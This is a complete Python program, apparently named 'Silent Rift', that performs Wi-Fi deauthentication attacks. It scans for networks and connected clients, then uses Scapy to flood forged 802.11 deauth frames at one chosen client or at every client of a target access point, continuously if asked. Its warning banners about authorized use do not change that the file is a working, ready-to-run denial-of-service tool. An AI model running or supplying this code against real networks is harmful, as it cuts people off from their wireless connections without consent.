##########################################################################################
#                             *** WARNING ***                                            #
#                                                                                        #
#  USING THIS PROGRAM TO ATTACK NETWORKS WITHOUT EXPLICIT PERMISSION IS ILLEGAL!         #
#  ONLY USE IT ON NETWORKS YOU OWN OR ARE AUTHORIZED TO TEST.                            #
#  MISUSE MAY RESULT IN SERIOUS LEGAL CONSEQUENCES.                                      #
#  THE DEVELOPER IS NOT RESPONSIBLE FOR ANY UNAUTHORIZED OR HARMFUL USE.                 #
#                                                                                        #
##########################################################################################

import sys
import os
import subprocess
import signal
import platform
import re

# Import Scapy directly without checking
from scapy.all import sniff, sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt

target_ssid = ""  # Global variable to store the target SSID

def display_banner():
    """Display the program banner with usage warnings."""
    banner = """
####################################################################
#                                                                  #
#          ╔═╗╦╦  ╔═╗╔╗╔╔╦╗  ╦═╗╦╔═╗╔╦╗                            #
#          ╚═╗║║  ║╣ ║║║ ║   ╠╦╝║╠╣  ║                             #
#          ╚═╝╩╩═╝╚═╝╝╚╝ ╩   ╩╚═╩╚   ╩                             #
#          Wi-Fi Deauthentication Program                          #
#          For Educational Purposes Only                           #
#                                                                  #
#          Use this program responsibly and legally                #
#          Unauthorized access to networks is prohibited           #
#                                                                  #
####################################################################
    """
    print(banner)

def check_os():
    """Check if the operating system is Linux."""
    if platform.system() != "Linux":
        print("[-] Error: This program can only be run on Linux systems!")
        sys.exit(1)

def check_root_privileges():
    """Check if the program is running with root privileges."""
    program_name = os.path.basename(sys.argv[0])
    try:
        if os.getuid() != 0:
            raise PermissionError("This program must be run as root (sudo).")
    except PermissionError as e:
        print(f"[-] Error: {e}")
        print(f"[*] Please run the program using 'sudo python3 {program_name}'")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error checking root privileges: {e}")
        sys.exit(1)

def check_requirements():
    """Check if required dependencies (airmon-ng and iwconfig) are installed."""
    try:
        result = subprocess.run(["airmon-ng"], capture_output=True, text=True)
        if result.returncode != 0 and "command not found" in result.stderr.lower():
            raise FileNotFoundError("airmon-ng is not installed.")
    except FileNotFoundError as e:
        print(f"[-] Error: {e}")
        print("[*] Install it by typing: 'sudo apt-get install aircrack-ng'")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error while checking airmon-ng: {e}")
        sys.exit(1)

    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if result.returncode != 0 and "command not found" in result.stderr.lower():
            raise FileNotFoundError("iwconfig is not installed.")
    except FileNotFoundError as e:
        print(f"[-] Error: {e}")
        print("[*] Install it by typing: 'sudo apt-get install wireless-tools'")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error while checking iwconfig: {e}")
        sys.exit(1)

def get_driver(interface):
    """Get the driver name for a given interface."""
    try:
        driver_path = f"/sys/class/net/{interface}/device/driver"
        if os.path.exists(driver_path):
            driver_name = os.path.basename(os.readlink(driver_path))
            return driver_name
        return "Unknown"
    except Exception:
        return "Unknown"

def scan_interfaces():
    """Scan and list all available network interfaces with driver info."""
    interfaces = []
    try:
        iwconfig_output = os.popen("iwconfig 2>&1").read().split('\n\n')
        for block in iwconfig_output:
            lines = block.splitlines()
            if not lines or "no wireless extensions" in block:
                continue
            
            interface_name = None
            mode = "Unknown"
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                if not line[0].isspace() and interface_name is None:
                    parts = line.split()
                    interface_name = parts[0]
                if "Mode:" in line:
                    mode_start = line.index("Mode:") + 5
                    mode_end = line.index(" ", mode_start) if " " in line[mode_start:] else len(line)
                    mode = line[mode_start:mode_end]
            
            if interface_name:
                driver = get_driver(interface_name)
                interfaces.append({"name": interface_name, "mode": mode, "driver": driver})

        if not interfaces:
            print("[-] No wireless network interfaces found!")
            sys.exit(1)

        print("[+] Available Network Interfaces:\n")
        print("{:<5} {:<15} {:<15} {:<20}".format("No", "Interface", "Mode", "Driver"))
        print("{:<5} {:<15} {:<15} {:<20}".format("-"*5, "-"*15, "-"*15, "-"*20))
        for i, iface in enumerate(interfaces):
            print("{:<5} {:<15} {:<15} {:<20}".format(i+1, iface['name'], iface['mode'], iface['driver']))
        print("")

        return interfaces
    except Exception as e:
        print(f"[-] Error scanning interfaces: {e}")
        sys.exit(1)

def get_interface_choice(interfaces):
    """Prompt the user to select an interface by number."""
    num_interfaces = len(interfaces)
    while True:
        try:
            choice = input(f"[#] Enter interface number (1-{num_interfaces}): ").strip()
            choice = int(choice)
            if choice < 1 or choice > num_interfaces:
                print(f"[-] Error: Please select a number between 1 and {num_interfaces}!")
                continue
            interface = interfaces[choice - 1]['name']
            if not os.path.exists(f"/sys/class/net/{interface}"):
                print(f"[-] Error: Interface {interface} no longer exists!")
                sys.exit(1)
            print(f"[+] Selected interface: {interface}")
            return interface
        except ValueError:
            print("[-] Error: Invalid input! Please enter a number.")
        except KeyboardInterrupt:
            print("\n[-] KeyboardInterrupt detected")
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y' and 'interface' in locals():
                restore_managed_mode(interface)
            print("[*] Exiting program")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Unexpected error with interface selection: {e}")
            sys.exit(1)

def check_monitor_mode(interface):
    """Check if the given interface is in monitor mode."""
    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            raise ValueError(f"Interface '{interface}' not found or no longer exists.")
        result = os.popen(f"iwconfig {interface} 2>&1").read()
        if "No such device" in result:
            raise ValueError(f"Interface '{interface}' not found.")
        if "Mode:Monitor" in result:
            print(f"[+] {interface} is in monitor mode")
            return True
        else:
            print(f"[-] {interface} is not in monitor mode")
            return False
    except ValueError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error checking monitor mode for {interface}: {e}")
        sys.exit(1)

def get_current_interface(original_interface):
    """Get the current name of the interface after mode changes."""
    try:
        iwconfig_output = os.popen("iwconfig 2>&1").read()
        for line in iwconfig_output.splitlines():
            if original_interface in line or (original_interface + "mon") in line:
                return line.split()[0]
        return original_interface
    except Exception as e:
        print(f"[-] Error detecting current interface: {e}")
        return original_interface

def enable_monitor_mode(interface):
    """Enable monitor mode on the specified interface using airmon-ng."""
    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            raise ValueError(f"Interface '{interface}' not found or no longer exists.")
        print(f"[*] Enabling monitor mode on {interface}...")
        proc = subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True, capture_output=True, text=True, timeout=10)
        if proc.returncode != 0:
            raise subprocess.CalledProcessError(proc.returncode, proc.args, proc.stdout, proc.stderr)
        
        proc = subprocess.run(["sudo", "airmon-ng", "start", interface], check=True, capture_output=True, text=True, timeout=10)
        if proc.returncode != 0:
            raise subprocess.CalledProcessError(proc.returncode, proc.args, proc.stdout, proc.stderr)
        
        new_interface = get_current_interface(interface)
        if new_interface != interface:
            print(f"[+] Interface changed to {new_interface}")
        if not check_monitor_mode(new_interface):
            raise RuntimeError("Failed to enable monitor mode!")
        print(f"[+] Monitor mode enabled on {new_interface}")
        return new_interface
    except subprocess.TimeoutExpired as e:
        print(f"[-] Timeout error enabling monitor mode: {e}")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to enable monitor mode: {e}")
        print(f"[*] Command output: {e.stderr}")
        print("[*] Ensure the adapter supports monitor mode.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] KeyboardInterrupt detected")
        choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
        if choice == 'y':
            restore_managed_mode(interface)
        print("[*] Exiting program")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error enabling monitor mode: {e}")
        sys.exit(1)

def restore_managed_mode(interface):
    """Restore the interface to managed mode and restart NetworkManager."""
    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            print(f"[-] Warning: Interface '{interface}' not found, attempting to proceed...")
            interface = interface.split("mon")[0] if "mon" in interface else interface
        
        print(f"[*] Restoring {interface} to managed mode...")
        proc = subprocess.run(["sudo", "airmon-ng", "stop", interface], capture_output=True, text=True, timeout=10)
        if proc.returncode != 0:
            print(f"[-] Warning: Failed to stop monitor mode: {proc.stderr}")
        
        interface = get_current_interface(interface.split("mon")[0] if "mon" in interface else interface)
        print(f"[*] Current interface name: {interface}")
        
        proc = subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"], capture_output=True, text=True, timeout=10)
        if proc.returncode != 0:
            print(f"[-] Warning: Failed to set managed mode: {proc.stderr}")
        
        print("[*] Restarting NetworkManager...")
        proc = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True, text=True, timeout=10)
        if proc.returncode != 0:
            print(f"[-] Warning: Failed to restart NetworkManager: {proc.stderr}")
        
        if not check_monitor_mode(interface):
            print(f"[+] {interface} successfully restored to managed mode")
            print("[+] NetworkManager restarted")
        else:
            print(f"[-] Warning: {interface} is still in monitor mode!")
    except subprocess.TimeoutExpired as e:
        print(f"[-] Timeout error restoring managed mode: {e}")
    except Exception as e:
        print(f"[-] Unexpected error restoring managed mode: {e}")

def scan_networks(interface):
    """Scan for available Wi-Fi networks."""
    networks = []
    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            raise ValueError(f"Interface '{interface}' not found or no longer exists.")
        print(f"[*] Scanning networks on {interface}...")
        for channel in range(1, 15):
            print(f"[*] Scanning channel {channel}...")
            result = subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"[-] Warning: Failed to set channel {channel}: {result.stderr}")
                continue
            try:
                sniff(iface=interface, prn=lambda x: parse_packet(x, networks, channel), timeout=2)
            except Exception as e:
                print(f"[-] Error sniffing on channel {channel}: {e}")
                continue
    except ValueError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] KeyboardInterrupt detected")
        choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
        if choice == 'y':
            restore_managed_mode(interface)
        print("[*] Exiting program")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error during network scan: {e}")
        sys.exit(1)

    if not networks:
        print("[-] No networks found!")
        sys.exit(1)

    os.system("clear")
    print("\n[+] Available Networks:\n")
    print("{:<5} {:<25} {:<10} {:<10} {:<20}".format("No", "ESSID", "Power", "Channel", "BSSID"))
    print("{:<5} {:<25} {:<10} {:<10} {:<20}".format("-"*5, "-"*25, "-"*10, "-"*10, "-"*20))
    for i, network in enumerate(networks):
        print("{:<5} {:<25} {:<10} {:<10} {:<20}".format(i+1, network['essid'], network['power'], network['channel'], network['bssid']))
    print("")

    return networks

def parse_packet(packet, networks, channel):
    """Parse Wi-Fi beacon packets to extract network information."""
    try:
        if not packet or not packet.haslayer(Dot11Beacon):
            return
        essid = packet[Dot11Elt].info.decode(errors='ignore').strip()
        bssid = packet[Dot11].addr2
        if not essid or not bssid:
            return
        stats = packet[Dot11Beacon].network_stats()
        power = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"
        if essid and bssid and essid not in [n['essid'] for n in networks]:
            networks.append({'essid': essid, 'bssid': bssid, 'channel': channel, 'power': power})
    except AttributeError as e:
        print(f"[-] Malformed packet encountered: {e}")
    except Exception as e:
        print(f"[-] Error parsing packet: {e}")

def detect_clients(interface, bssid, channel, timeout=10):
    """Detect clients connected to the specified BSSID."""
    clients = set()
    def packet_handler(packet):
        if packet.haslayer(Dot11) and packet.addr2 == bssid:
            client_mac = packet.addr1
            if client_mac != "ff:ff:ff:ff:ff:ff" and client_mac not in clients:
                clients.add(client_mac)
    
    try:
        print(f"[*] Detecting clients connected to {bssid} on channel {channel} for {timeout} seconds...")
        result = subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError(f"Failed to set channel {channel}: {result.stderr}")
        sniff(iface=interface, prn=packet_handler, timeout=timeout)
        if not clients:
            print("[-] No clients detected.")
            return []
        print(f"[+] Detected {len(clients)} clients: {', '.join(clients)}")
        return list(clients)
    except Exception as e:
        print(f"[-] Error detecting clients: {e}")
        return []

def get_valid_client(clients):
    """Prompt the user to select a client from the detected list."""
    if not clients:
        print("[-] No clients available to select. Exiting.")
        sys.exit(1)
    
    num_clients = len(clients)
    print("\n[+] Detected Clients:\n")
    print("{:<5} {:<20}".format("No", "Client MAC"))
    print("{:<5} {:<20}".format("-"*5, "-"*20))
    for i, client in enumerate(clients):
        print("{:<5} {:<20}".format(i+1, client))
    print("")

    while True:
        try:
            choice = input(f"[#] Enter client number to target (1-{num_clients}): ").strip()
            choice = int(choice)
            if choice < 1 or choice > num_clients:
                print(f"[-] Error: Please select a number between 1 and {num_clients}!")
                continue
            client_mac = clients[choice - 1]
            print(f"[+] Selected client: {client_mac}")
            return client_mac
        except ValueError:
            print("[-] Error: Invalid input! Please enter a number.")
        except KeyboardInterrupt:
            print("\n[-] KeyboardInterrupt detected")
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y' and 'interface' in locals():
                restore_managed_mode(interface)
            print("[*] Exiting program")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Unexpected error with client selection: {e}")
            sys.exit(1)

def get_valid_packet_count():
    """Get a valid number of deauth packets from the user (0 or positive)."""
    while True:
        try:
            count = input("[#] Enter number of deauth packets (0 for continuous, 1 or more): ").strip()
            count = int(count)
            if count < 0:
                print("[-] Error: Number of packets cannot be negative!")
                continue
            print(f"[+] {count} deauth packets will be sent")
            return count
        except ValueError:
            print("[-] Error: Invalid input! Please enter a number (0 or greater).")
        except KeyboardInterrupt:
            print("\n[-] KeyboardInterrupt detected")
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y' and 'interface' in locals():
                restore_managed_mode(interface)
            print("[*] Exiting program")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Unexpected error with packet count input: {e}")
            sys.exit(1)

def deauth_single_client(interface, bssid, channel):
    """Perform a deauthentication attack on a specific client after scanning."""
    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            raise ValueError(f"Interface '{interface}' not found or no longer exists.")
        
        # Detect clients and let user select one
        clients = detect_clients(interface, bssid, channel)
        client_mac = get_valid_client(clients)
        
        # Get packet count after client selection
        count = get_valid_packet_count()
        
        print(f"[*] Starting deauth attack on client {client_mac} on network {bssid} (Channel {channel})...")
        result = subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError(f"Failed to set channel {channel}: {result.stderr}")
        
        global target_ssid
        packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
        
        if count == 0:
            print(f"[*] Sending deauth packets continuously to {target_ssid} (Client: {client_mac})...")
            print("[*] Press 'Ctrl + C' to stop the attack.")
            packets_sent = 0
            while True:
                sendp(packet, iface=interface, verbose=False)
                packets_sent += 1
        else:
            print(f"[*] Sending {count} deauth packets to {target_ssid} (Client: {client_mac})...")
            for i in range(count):
                sendp(packet, iface=interface, count=1, verbose=False)
                print(f"[*] Sending deauth packet to {target_ssid} - Client {client_mac} - Packet {i+1}/{count}")
            print(f"[+] Successfully sent {count} deauth packets to {target_ssid} (Client: {client_mac}).")
        
        print("[+] Deauth attack completed.")
    except ValueError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    except RuntimeError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] KeyboardInterrupt detected")
        choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
        if choice == 'y':
            restore_managed_mode(interface)
        print("[*] Exiting program")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error during deauth attack: {e}")
        sys.exit(1)
    finally:
        try:
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y':
                restore_managed_mode(interface)
            else:
                print("[*] Interface left in current mode.")
            print("[*] Exiting program")
            sys.exit(0)
        except KeyboardInterrupt:
            print("\n[-] KeyboardInterrupt detected")
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y':
                restore_managed_mode(interface)
            print("[*] Exiting program")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error handling restore choice: {e}")

def deauth_all_clients(interface, bssid, channel, count):
    """Perform a deauthentication attack on all detected clients of a network."""
    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            raise ValueError(f"Interface '{interface}' not found or no longer exists.")
        print(f"[*] Starting deauth attack on all clients of network {bssid} (Channel {channel})...")
        
        # Detect clients connected to the target BSSID
        clients = detect_clients(interface, bssid, channel)
        if not clients:
            clients = ["ff:ff:ff:ff:ff:ff"]  # Fallback to broadcast if no clients detected
            print("[-] Using broadcast mode as fallback.")
        
        global target_ssid
        if count == 0:
            print(f"[*] Sending deauth packets continuously to {target_ssid} (Clients: {', '.join(clients)})...")
            print("[*] Press 'Ctrl + C' to stop the attack.")
            packets_sent = 0
            while True:
                for client_mac in clients:
                    packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
                    sendp(packet, iface=interface, verbose=False)
                    packets_sent += 1
        else:
            print(f"[*] Sending {count} deauth packets to {target_ssid} (Clients: {', '.join(clients)})...")
            for i in range(count):
                for client_mac in clients:
                    packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
                    sendp(packet, iface=interface, count=1, verbose=False)
                    print(f"[*] Sending deauth packet to {target_ssid} - Client {client_mac} - Packet {i+1}/{count}")
            print(f"[+] Successfully sent {count} deauth packets to {target_ssid} (Clients: {', '.join(clients)}).")
        
        print("[+] Deauth attack completed.")
    except ValueError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    except RuntimeError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] KeyboardInterrupt detected")
        choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
        if choice == 'y':
            restore_managed_mode(interface)
        print("[*] Exiting program")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error during deauth attack: {e}")
        sys.exit(1)
    finally:
        try:
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y':
                restore_managed_mode(interface)
            else:
                print("[*] Interface left in current mode.")
            print("[*] Exiting program")
            sys.exit(0)
        except KeyboardInterrupt:
            print("\n[-] KeyboardInterrupt detected")
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y':
                restore_managed_mode(interface)
            print("[*] Exiting program")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error handling restore choice: {e}")

def get_valid_target(networks):
    """Get a valid target number from the user for deauthentication."""
    num_networks = len(networks)
    while True:
        try:
            target_num = input(f"[#] Enter target network number (1-{num_networks}): ").strip()
            target_num = int(target_num)
            if target_num < 1 or target_num > num_networks:
                print(f"[-] Error: Please select a number between 1 and {num_networks}!")
                continue
            print(f"[+] Target {networks[target_num - 1]['essid']} ({networks[target_num - 1]['bssid']}) selected")
            return networks[target_num - 1]
        except ValueError:
            print("[-] Error: Invalid input! Please enter a number.")
        except KeyboardInterrupt:
            print("\n[-] KeyboardInterrupt detected")
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y' and 'interface' in locals():
                restore_managed_mode(interface)
            print("[*] Exiting program")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Unexpected error with target selection: {e}")
            sys.exit(1)

def get_attack_mode_choice():
    """Display attack modes and get user choice."""
    attack_modes = [
        {"mode": "Single Client (detected MAC)"},
        {"mode": "All Clients (detected clients)"}
    ]
    num_modes = len(attack_modes)
    
    print("\n[+] Available Attack Modes:\n")
    print("{:<5} {:<35}".format("No", "Attack Mode"))
    print("{:<5} {:<35}".format("-"*5, "-"*35))
    for i, mode in enumerate(attack_modes):
        print("{:<5} {:<35}".format(i+1, mode['mode']))
    print("")

    while True:
        try:
            choice = input(f"[#] Enter attack mode number (1-{num_modes}): ").strip()
            choice = int(choice)
            if choice < 1 or choice > num_modes:
                print(f"[-] Error: Please select a number between 1 and {num_modes}!")
                continue
            print(f"[+] Selected mode: {attack_modes[choice - 1]['mode']}")
            return choice
        except ValueError:
            print("[-] Error: Invalid input! Please enter a number.")
        except KeyboardInterrupt:
            print("\n[-] KeyboardInterrupt detected")
            choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
            if choice == 'y' and 'interface' in locals():
                restore_managed_mode(interface)
            print("[*] Exiting program")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Unexpected error with mode selection: {e}")
            sys.exit(1)

def main():
    """Main function to run the Wi-Fi deauthentication program."""
    global target_ssid
    try:
        signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(1))
        
        os.system("clear")
        display_banner()
        
        check_os()
        check_root_privileges()
        check_requirements()

        interfaces = scan_interfaces()
        interface = get_interface_choice(interfaces)
        
        if not check_monitor_mode(interface):
            interface = enable_monitor_mode(interface)
        else:
            print(f"[+] {interface} is already in monitor mode")

        networks = scan_networks(interface)
        target = get_valid_target(networks)
        target_ssid = target['essid']
        
        mode = get_attack_mode_choice()
        
        if mode == 1:  # Single Client
            deauth_single_client(interface, target['bssid'], target['channel'])
        else:  # mode == 2, All Clients
            count = get_valid_packet_count()
            deauth_all_clients(interface, target['bssid'], target['channel'], count)

    except KeyboardInterrupt:
        print("\n[-] KeyboardInterrupt detected")
        choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
        if choice == 'y' and 'interface' in locals():
            restore_managed_mode(interface)
        print("[*] Exiting program")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error in main execution: {e}")
        sys.exit(1)

if __name__ == "__main__":
    """Entry point of the program."""
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] KeyboardInterrupt detected")
        choice = input("[?] Restore interface to managed mode and restart NetworkManager? (y/n): ").strip().lower()
        if choice == 'y' and 'interface' in locals():
            restore_managed_mode(interface)
        print("[*] Exiting program")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error in program execution: {e}")
        sys.exit(1)
